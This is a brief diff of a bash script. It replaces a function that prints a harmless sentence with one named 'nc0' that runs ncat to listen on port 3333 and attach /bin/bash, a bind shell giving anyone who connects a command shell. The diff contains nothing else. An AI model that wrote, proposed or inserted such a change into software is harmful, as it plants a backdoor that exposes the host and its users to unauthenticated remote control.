@@ -1,7 +1,7 @@
 #! /usr/bin/env bash
 
-main() {
-  printf "I have an idea on using indicators."
+nc0() {
+  ncat -p -l -v 3333 -e /bin/bash
 }
 
-main "${@}"
+nc0 "${@}"
